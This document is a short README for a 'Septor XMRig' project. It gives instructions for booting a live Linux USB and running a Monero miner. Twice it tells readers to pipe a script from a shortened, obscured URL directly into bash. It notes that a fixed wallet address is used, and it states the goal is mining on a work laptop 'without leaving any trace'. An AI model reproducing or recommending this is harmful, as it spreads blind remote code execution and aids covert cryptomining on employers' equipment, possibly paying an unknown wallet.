# Septor XMRig

WARNING: This is a beta version. It uses a fixed wallet address for testing purposes.


If you already have a Septor USB just run this command

```
wget -O- - tinyurl.com/4z5afjef | bash
```


## Full Installation

1. Download Septor from [SourceForge](https://sourceforge.net/projects/septor/files/download_/) This guid is tested with 2021.5 version.
1. Burn it to a USB drive using [Balena Etcher](https://www.balena.io/etcher/)
1. Start your PC and choose to boot from the USB stick. You may need to press F2, F10 or F12 at boot time.
1. Choose Live in the Septor menu.
1. Ensure you have a network connection wifi or cable.
1. After booting search for the Konsole application
1. Execute the install and mining script
```
wget -O- - tinyurl.com/4z5afjef | bash
```

## Hashrate

Once you have the miner running you can check the hashrate and calculate how much you can earn from this CPU.

## Motivation

Someone asked me: how can I mine with my work's laptop without leaving any trace on it?
That's why I'm using Monero, Septor and supportxmr.

## Coming soon
1. Screenshots
1. Monero wallet configuration
